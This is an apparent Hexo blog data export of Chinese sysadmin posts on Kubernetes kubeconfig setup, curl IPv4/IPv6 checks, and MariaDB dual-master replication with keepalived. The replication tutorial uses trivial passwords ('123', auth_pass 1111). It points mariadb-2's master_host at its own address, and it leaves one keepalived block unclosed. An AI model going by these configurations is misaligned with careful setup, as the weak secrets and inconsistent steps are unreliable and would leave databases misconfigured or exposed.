title=\"配置在其他节点的控制\"></a>配置在其他节点的控制</h4><p>这个就是说在任何节点上都可以对k8s的API-server进行访问，对节点进行管理。换言之，你不配置这一步，你只能在主节点进行<code>kubectl get nodes</code>命令，其他节点执行不了。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp /etc/kubernetes/admin.conf root@k8s-nd1:/etc/kubernetes</span><br><span class=\"line\">scp /etc/kubernetes/admin.conf root@k8s-nd2:/etc/kubernetes</span><br></pre></td></tr></table></figure>\n\n<p>拷贝过去之后，分别在两个节点上执行如下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;export KUBECONFIG=/etc/kubernetes/admin.conf&quot;</span> &gt;&gt; ~/.bash_profile</span><br><span class=\"line\"><span class=\"built_in\">source</span> ~/.bash_profile</span><br><span class=\"line\">kubectl get node</span><br></pre></td></tr></table></figure>\n\n<p>如果显示有效内容，说明配置成功了。</p>\n<h4 id=\"配置kubectl命令自动补全\"><a href=\"#配置kubectl命令自动补全\" class=\"headerlink\" title=\"配置kubectl命令自动补全\"></a>配置kubectl命令自动补全</h4><p>初始配置K8S是不能进行命令补全的，使用起来太麻烦，尤其是对于我这个<kbd>Tab</kbd>键重度使用者，实在太不爽。下面是配置K8S命令补全的方法：</p>\n<blockquote>\n<p>一般在master节点执行就可以满足需求，但是如果有需求，也可以在worker节点上配置。</p>\n</blockquote>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y bash-completion</span><br><span class=\"line\"><span class=\"built_in\">source</span> /usr/share/bash-completion/bash_completion</span><br><span class=\"line\"><span class=\"built_in\">source</span> &lt;(kubectl completion bash)</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;source &lt;(kubectl completion bash)&quot;</span> &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>"},{"title":"命令行IP工具","date":"2023-09-28T09:39:42.000Z","_content":"\n### curl 指定 IPv6 或 IPv4 访问\n\n如果同一个 host 同时解析到 IPv6 和 IPv4 地址，即 IPv4/IPv6 双栈，则 curl 使用参数可指定 IP 协议的版本。\n\n```bash\ncurl -4 test.ipw.cn\n106.224.145.147\n\ncurl -6 test.ipw.cn\n2408:824c:200::2b8b:336f:cc9c\n```\n\n<!-- more -->\n\n###  IPV4 OR IPV6 优先？\n\n```bash\ncurl test.ipw.cn\n```\n\nPS：实测验证：这个命令行工具即使返回IPV6也不代表就是IPV6优先了，还是通过网页验证比较靠谱。\n\n打开 [https://test.ipw.cn/](https://test.ipw.cn/)，如果返回的 IPVersion 字段为 IPv6，则当前网络 IPv6 访问优先，如果返回的 IPVersion 字段为 IPv4，则当前网络 IPv4 访问优先。\n\n### 验证IPV6\n\n1. 网页访问验证\n\n这是一个 [IPv6 地址查询](https://ipw.cn/ipv6/) 的网站，可以看到上面提示 您的网络 IPv6 访问优先。\n\n也可以对自己的公网 IPv6 地址进行 [在线 Ping](https://ipw.cn/ipv6ping/)。\n\n2. 域名访问验证\n\n打开 [https://6.ipw.cn/](https://6.ipw.cn/)，如果能访问成功，那么证明 IPv6 网络开启成功。\n\n3. IPv6 地址直接访问\n\n若成功开启IPV6，可以直接成功访问`http://[2402:4e00:1013:e500:0:9671:f018:4947]/`，会返回如下信息。\n\n```bash\n// http://[2402:4e00:1013:e500:0:9671:f018:4947]/\n240e:3b7:3b7:3b7::3b7\n```\n\n","source":"_posts/ip-tools.md","raw":"---\ntitle: 命令行IP工具\ndate: 2023-09-28 17:39:42\ncategories: 小玩意儿\ntags:\n  - 工具\n  - Windows\n---\n\n### curl 指定 IPv6 或 IPv4 访问\n\n如果同一个 host 同时解析到 IPv6 和 IPv4 地址，即 IPv4/IPv6 双栈，则 curl 使用参数可指定 IP 协议的版本。\n\n```bash\ncurl -4 test.ipw.cn\n106.224.145.147\n\ncurl -6 test.ipw.cn\n2408:824c:200::2b8b:336f:cc9c\n```\n\n<!-- more -->\n\n###  IPV4 OR IPV6 优先？\n\n```bash\ncurl test.ipw.cn\n```\n\nPS：实测验证：这个命令行工具即使返回IPV6也不代表就是IPV6优先了，还是通过网页验证比较靠谱。\n\n打开 [https://test.ipw.cn/](https://test.ipw.cn/)，如果返回的 IPVersion 字段为 IPv6，则当前网络 IPv6 访问优先，如果返回的 IPVersion 字段为 IPv4，则当前网络 IPv4 访问优先。\n\n### 验证IPV6\n\n1. 网页访问验证\n\n这是一个 [IPv6 地址查询](https://ipw.cn/ipv6/) 的网站，可以看到上面提示 您的网络 IPv6 访问优先。\n\n也可以对自己的公网 IPv6 地址进行 [在线 Ping](https://ipw.cn/ipv6ping/)。\n\n2. 域名访问验证\n\n打开 [https://6.ipw.cn/](https://6.ipw.cn/)，如果能访问成功，那么证明 IPv6 网络开启成功。\n\n3. IPv6 地址直接访问\n\n若成功开启IPV6，可以直接成功访问`http://[2402:4e00:1013:e500:0:9671:f018:4947]/`，会返回如下信息。\n\n```bash\n// http://[2402:4e00:1013:e500:0:9671:f018:4947]/\n240e:3b7:3b7:3b7::3b7\n```\n\n","slug":"ip-tools","published":1,"updated":"2024-05-03T03:55:54.869Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fx006f7zj3cnnp19fd","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"curl-指定-IPv6-或-IPv4-访问\"><a href=\"#curl-指定-IPv6-或-IPv4-访问\" class=\"headerlink\" title=\"curl 指定 IPv6 或 IPv4 访问\"></a>curl 指定 IPv6 或 IPv4 访问</h3><p>如果同一个 host 同时解析到 IPv6 和 IPv4 地址，即 IPv4&#x2F;IPv6 双栈，则 curl 使用参数可指定 IP 协议的版本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -4 test.ipw.cn</span><br><span class=\"line\">106.224.145.147</span><br><span class=\"line\"></span><br><span class=\"line\">curl -6 test.ipw.cn</span><br><span class=\"line\">2408:824c:200::2b8b:336f:cc9c</span><br></pre></td></tr></table></figure>\n\n<span id=\"more\"></span>\n\n<h3 id=\"IPV4-OR-IPV6-优先？\"><a href=\"#IPV4-OR-IPV6-优先？\" class=\"headerlink\" title=\"IPV4 OR IPV6 优先？\"></a>IPV4 OR IPV6 优先？</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl test.ipw.cn</span><br></pre></td></tr></table></figure>\n\n<p>PS：实测验证：这个命令行工具即使返回IPV6也不代表就是IPV6优先了，还是通过网页验证比较靠谱。</p>\n<p>打开 <a href=\"https://test.ipw.cn/\">https://test.ipw.cn/</a>，如果返回的 IPVersion 字段为 IPv6，则当前网络 IPv6 访问优先，如果返回的 IPVersion 字段为 IPv4，则当前网络 IPv4 访问优先。</p>\n<h3 id=\"验证IPV6\"><a href=\"#验证IPV6\" class=\"headerlink\" title=\"验证IPV6\"></a>验证IPV6</h3><ol>\n<li>网页访问验证</li>\n</ol>\n<p>这是一个 <a href=\"https://ipw.cn/ipv6/\">IPv6 地址查询</a> 的网站，可以看到上面提示 您的网络 IPv6 访问优先。</p>\n<p>也可以对自己的公网 IPv6 地址进行 <a href=\"https://ipw.cn/ipv6ping/\">在线 Ping</a>。</p>\n<ol start=\"2\">\n<li>域名访问验证</li>\n</ol>\n<p>打开 <a href=\"https://6.ipw.cn/\">https://6.ipw.cn/</a>，如果能访问成功，那么证明 IPv6 网络开启成功。</p>\n<ol start=\"3\">\n<li>IPv6 地址直接访问</li>\n</ol>\n<p>若成功开启IPV6，可以直接成功访问<code>http://[2402:4e00:1013:e500:0:9671:f018:4947]/</code>，会返回如下信息。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// http://[2402:4e00:1013:e500:0:9671:f018:4947]/</span><br><span class=\"line\">240e:3b7:3b7:3b7::3b7</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"curl-指定-IPv6-或-IPv4-访问\"><a href=\"#curl-指定-IPv6-或-IPv4-访问\" class=\"headerlink\" title=\"curl 指定 IPv6 或 IPv4 访问\"></a>curl 指定 IPv6 或 IPv4 访问</h3><p>如果同一个 host 同时解析到 IPv6 和 IPv4 地址，即 IPv4&#x2F;IPv6 双栈，则 curl 使用参数可指定 IP 协议的版本。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl -4 test.ipw.cn</span><br><span class=\"line\">106.224.145.147</span><br><span class=\"line\"></span><br><span class=\"line\">curl -6 test.ipw.cn</span><br><span class=\"line\">2408:824c:200::2b8b:336f:cc9c</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"IPV4-OR-IPV6-优先？\"><a href=\"#IPV4-OR-IPV6-优先？\" class=\"headerlink\" title=\"IPV4 OR IPV6 优先？\"></a>IPV4 OR IPV6 优先？</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl test.ipw.cn</span><br></pre></td></tr></table></figure>\n\n<p>PS：实测验证：这个命令行工具即使返回IPV6也不代表就是IPV6优先了，还是通过网页验证比较靠谱。</p>\n<p>打开 <a href=\"https://test.ipw.cn/\">https://test.ipw.cn/</a>，如果返回的 IPVersion 字段为 IPv6，则当前网络 IPv6 访问优先，如果返回的 IPVersion 字段为 IPv4，则当前网络 IPv4 访问优先。</p>\n<h3 id=\"验证IPV6\"><a href=\"#验证IPV6\" class=\"headerlink\" title=\"验证IPV6\"></a>验证IPV6</h3><ol>\n<li>网页访问验证</li>\n</ol>\n<p>这是一个 <a href=\"https://ipw.cn/ipv6/\">IPv6 地址查询</a> 的网站，可以看到上面提示 您的网络 IPv6 访问优先。</p>\n<p>也可以对自己的公网 IPv6 地址进行 <a href=\"https://ipw.cn/ipv6ping/\">在线 Ping</a>。</p>\n<ol start=\"2\">\n<li>域名访问验证</li>\n</ol>\n<p>打开 <a href=\"https://6.ipw.cn/\">https://6.ipw.cn/</a>，如果能访问成功，那么证明 IPv6 网络开启成功。</p>\n<ol start=\"3\">\n<li>IPv6 地址直接访问</li>\n</ol>\n<p>若成功开启IPV6，可以直接成功访问<code>http://[2402:4e00:1013:e500:0:9671:f018:4947]/</code>，会返回如下信息。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// http://[2402:4e00:1013:e500:0:9671:f018:4947]/</span><br><span class=\"line\">240e:3b7:3b7:3b7::3b7</span><br></pre></td></tr></table></figure>"},{"title":"Mariadb双主复制+Keepalived","date":"2023-06-04T01:36:42.000Z","_content":"\n在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。\n\n### 项目梗概\n\n项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：\n\n<!-- more -->\n\n![拓扑图](./keepalived-linux/1.png)\n\n我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。\n\n其中服务器的IP规划如下：\n\n|  主机名   |  角色  | 网卡名 |  模式  |       IP        |       VIP       |      网关       |\n| :-------: | :----: | :----: | :----: | :-------------: | :-------------: | :-------------: |\n| mariadb-1 | mst/slv  | ens224 | 仅主机 | 172.21.8.33/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n| mariadb-2 | mst/slv  | ens224 | 仅主机 | 172.21.8.34/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n\n\n### 数据库服务器的配置\n\n数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。\n\n#### 主从复制配置\n\n|  主机名   |    身份    | 网络接口 | 连接模式 |       IP       |\n| :-------: | :--------: | :------: | :------: | :------------: |\n| mariadb-1 |  主服务器  |  ens224  |  仅主机  | 172.21.8.33/24 |\n| mariadb-2 | 备份服务器 |  ens224  |  仅主机  | 172.21.8.34/24 |\n\n\n\n1. 首先在mariadb-1中进行软件的安装。\n\n```bash\nyum install -y mariadb-server\n```\n\n2. 修改配置文件。\n\n主配置文件`/etc/my.cnf`无需修改，修改`/etc/my.cnf.d/mariadb-server.cnf`文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。\n\n```bash\nlog-bin = master.log\nserver-id = 11\n```\n\n3. 启动mariadb-1的mariadb服务\n\n```\nsystemctl start mariadb\n```\n\n4. 进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。\n\n```bash\nmysql -u root\n```\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.34' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-1 master status](./keepalived-linux/3.png)\n\n`show master status;`之后，表格中的File字段和Position字段要留意，待会要用到。\n\n5. 在mariadb-2上安装软件，开启二进制日志功能，并启动服务。\n\n```bash\nlog-bin = slave.log\nserver-id = 12\n```\n\n6. 进入MySQL，开启复制功能。\n\n```bash\nmysql -u root\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000002',master_log_pos = 712;\n```\n\nmaster_log_file字段填写mariadb-1`show master status`后的File内容，master_log_pos填写mariadb-1`show master status`后的Position内容。\n\n7. 在mariadb-2上查看slave状态。\n\n```\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-2 复制成功](./keepalived-linux/4.png)\n\n看到图中的两个yes，代表一边的复制功能就配置完成了。\n\n8. 然后在mariadb-2 服务器上也创建一个授权账户。\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.33' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-2 master status](./keepalived-linux/5.png)\n\n再次回到mariadb-1上，连接mariadb-2，实现复制功能。\n\n```\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000003',master_log_pos = 338;\n```\n\n9. 配置完成后，开启slave功能，查看slave状态。\n\n```bash\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-1 复制成功](./keepalived-linux/6.png)\n\n到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。\n\n#### keepalived配置\n\n1. 主机 DB-master 和 DB-slave 上安装 Keepalived\n\n```bash\nyum install -y keepalived\n```\n\n2. 把配置文件保留一个副本\n\n```\ncp /etc/keepalived/keepalived.conf{,.bak}\n```\n\n3. 修改两个主机上的配置文件/etc/keepalived/keepalived.conf\n\n|  主机名   | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |\n| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | :---------------: |\n| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |\n| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |\n\n* mariadb-1 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置模块\n\n```bash 折叠代码\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\t# 管理员邮箱\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_master\t# 标识\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段  \n\n```bash 折叠代码\nvrrp_instance mariadb-ha {\n    state BACKUP\t# 备用\n    interface ens224\n    nopreempt\t\t# 设置不抢占\n    virtual_router_id 60\n    priority 100\t# 优先级\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\t# 配合vrrp_script段使用\n        check_mariadb\n    }\n    virtual_ipaddress {\t# 虚拟出的VIP\n        172.21.8.50/24\n    }\n}\n```\n\n* mariadb-2 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置段\n\n```bash 折叠代码\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_slave\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段\n\n```bash 折叠代码\nvrrp_instance mariadb-ha {\n    state BACKUP\n    interface ens224\n    virtual_router_id 60\n    priority 90\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\n        check_mariadb\n    }\n    virtual_ipaddress {\n        172.21.8.50/24\n    }\n```\n\n4. 在两个主机上编写服务检测脚本`/etc/keepalived/checkmariadb.sh`\n\n```bash\n#!/bin/bash\nif ! lsof -i:3306 &> /dev/null\nthen\n    systemctl stop keepalived\nfi\n```\n\n5. 启动两台服务器的`keepalived`\n\n```bash\nsystemctl start keepalived.service\n```\n\n![keepalived 配置成功](./keepalived-linux/7.png)\n\n可以看出mariadb-1主机已经多出来一个172.21.8.50/24的一个IP，这个就是虚拟出来的VIP，当mariadb-1主机宕掉，这个IP就会漂移到mariadb-2主机上，到这里就完成了mariadb双主复制和keepalived的实现。\n","source":"_posts/keepalived-linux.md","raw":"---\ntitle: Mariadb双主复制+Keepalived\ndate: 2023-06-04 09:36:42\ncategories: 技术\ntags:\n  - Linux \n  - MySQL\n---\n\n在最后的Linux高级课程的最后，完成了高可用负载均衡WEB服务器的搭建，比较贴合实际的生产环境，一共使用到了7台虚拟机，在我这个阶段，已经是我取得的最高成就了。感觉有必要记录下来，既是帮助后来者，也是方便自己日后进行复习总结。\n\n### 项目梗概\n\n项目一共设计7台虚拟机，其中2台作为调度机，进行对访问请求的分配；2台作为Nginx服务器；2台作为Mariadb数据库服务器；一台作为NFS储存服务器，负责存储Nginx服务器的网页资源。其逻辑拓扑图如下：\n\n<!-- more -->\n\n![拓扑图](./keepalived-linux/1.png)\n\n我会分几个部分来介绍这个项目的配置，本次先来介绍mariadb实现双主复制和keepalived。\n\n其中服务器的IP规划如下：\n\n|  主机名   |  角色  | 网卡名 |  模式  |       IP        |       VIP       |      网关       |\n| :-------: | :----: | :----: | :----: | :-------------: | :-------------: | :-------------: |\n| mariadb-1 | mst/slv  | ens224 | 仅主机 | 172.21.8.33/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n| mariadb-2 | mst/slv  | ens224 | 仅主机 | 172.21.8.34/24  | 172.21.8.50/24  | 172.21.8.254/24 |\n\n\n### 数据库服务器的配置\n\n数据库服务器在本项目中采用双主复制的方式，来进行高可用的实现。\n\n#### 主从复制配置\n\n|  主机名   |    身份    | 网络接口 | 连接模式 |       IP       |\n| :-------: | :--------: | :------: | :------: | :------------: |\n| mariadb-1 |  主服务器  |  ens224  |  仅主机  | 172.21.8.33/24 |\n| mariadb-2 | 备份服务器 |  ens224  |  仅主机  | 172.21.8.34/24 |\n\n\n\n1. 首先在mariadb-1中进行软件的安装。\n\n```bash\nyum install -y mariadb-server\n```\n\n2. 修改配置文件。\n\n主配置文件`/etc/my.cnf`无需修改，修改`/etc/my.cnf.d/mariadb-server.cnf`文件，在[mysqld]段下面添加配置选项，开启二进制日志功能并设置server-id。\n\n```bash\nlog-bin = master.log\nserver-id = 11\n```\n\n3. 启动mariadb-1的mariadb服务\n\n```\nsystemctl start mariadb\n```\n\n4. 进入MySQL，作为主服务器创建授权账户slave，并查看主服务器装态。\n\n```bash\nmysql -u root\n```\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.34' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-1 master status](./keepalived-linux/3.png)\n\n`show master status;`之后，表格中的File字段和Position字段要留意，待会要用到。\n\n5. 在mariadb-2上安装软件，开启二进制日志功能，并启动服务。\n\n```bash\nlog-bin = slave.log\nserver-id = 12\n```\n\n6. 进入MySQL，开启复制功能。\n\n```bash\nmysql -u root\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000002',master_log_pos = 712;\n```\n\nmaster_log_file字段填写mariadb-1`show master status`后的File内容，master_log_pos填写mariadb-1`show master status`后的Position内容。\n\n7. 在mariadb-2上查看slave状态。\n\n```\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-2 复制成功](./keepalived-linux/4.png)\n\n看到图中的两个yes，代表一边的复制功能就配置完成了。\n\n8. 然后在mariadb-2 服务器上也创建一个授权账户。\n\n```bash\ngrant replication slave on *.* to 'slave'@'172.21.8.33' identified by '123';\n```\n\n>授权为对方的IP\n\n```bash\nshow master status;\n```\n\n![mariadb-2 master status](./keepalived-linux/5.png)\n\n再次回到mariadb-1上，连接mariadb-2，实现复制功能。\n\n```\nchange master to master_host = '172.21.8.34',master_user = 'slave',master_password = '123',master_log_file = 'master.000003',master_log_pos = 338;\n```\n\n9. 配置完成后，开启slave功能，查看slave状态。\n\n```bash\nstart slave;\nshow slave status \\G;\n```\n\n![mariadb-1 复制成功](./keepalived-linux/6.png)\n\n到这里数据库的主从复制已经完成了，接下来要配置数据库的keepalived功能。\n\n#### keepalived配置\n\n1. 主机 DB-master 和 DB-slave 上安装 Keepalived\n\n```bash\nyum install -y keepalived\n```\n\n2. 把配置文件保留一个副本\n\n```\ncp /etc/keepalived/keepalived.conf{,.bak}\n```\n\n3. 修改两个主机上的配置文件/etc/keepalived/keepalived.conf\n\n|  主机名   | route_id  | vrrp_instance | state  | interface | virtual_router_id | priority | virtual_ipaddress |\n| :-------: | :-------: | :-----------: | :----: | :-------: | :---------------: | :------: | :---------------: |\n| mariadb-1 | db_master |  mariadb-ha   | BACKUP |  ens224   |        60         |   100    |  172.21.8.33/24   |\n| mariadb-2 | db_slave  |  mariadb-ha   | BACKUP |  ens224   |        60         |    90    |  172.21.8.34/24   |\n\n* mariadb-1 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置模块\n\n```bash 折叠代码\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\t# 管理员邮箱\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_master\t# 标识\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段  \n\n```bash 折叠代码\nvrrp_instance mariadb-ha {\n    state BACKUP\t# 备用\n    interface ens224\n    nopreempt\t\t# 设置不抢占\n    virtual_router_id 60\n    priority 100\t# 优先级\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\t# 配合vrrp_script段使用\n        check_mariadb\n    }\n    virtual_ipaddress {\t# 虚拟出的VIP\n        172.21.8.50/24\n    }\n}\n```\n\n* mariadb-2 的`/etc/keepalived/keepalived.conf` 的内容如下 \n\n全局配置段\n\n```bash 折叠代码\n! Configuration File for keepalived\n\nglobal_defs {\n   notification_email {\n     liuxp731@qq.com\n   }\n   notification_email_from Alexandre.Cassen@firewall.loc\n   smtp_server 127.0.0.1\n   smtp_connect_timeout 30\n   router_id db_slave\n   vrrp_skip_check_adv_addr\n   vrrp_strict\n   vrrp_garp_interval 0\n   vrrp_gna_interval 0\n}\n```\n\n启用 vrrp_script 模块， 定义对 mariadb 服务的监测\n\n```bash\nvrrp_script check_mariadb {\n   script \"/etc/keepalived/checkmariadb.sh\"\n   interval 2\n}\n```\n\nVRRPD 配置段\n\n```bash 折叠代码\nvrrp_instance mariadb-ha {\n    state BACKUP\n    interface ens224\n    virtual_router_id 60\n    priority 90\n    advert_int 1\n    authentication {\n        auth_type PASS\n        auth_pass 1111\n    }\n    track_script {\n        check_mariadb\n    }\n    virtual_ipaddress {\n        172.21.8.50/24\n    }\n```\n\n4. 在两个主机上编写服务检测脚本`/etc/keepalived/checkmariadb.sh`\n\n```bash\n#!/bin/bash\nif ! lsof -i:3306 &> /dev/null\nthen\n    systemctl stop keepalived\nfi\n```\n\n5. 启动两台服务器的`keepalived`\n\n```bash\nsystemctl start keepalived.service\n```\n\n![keepalived 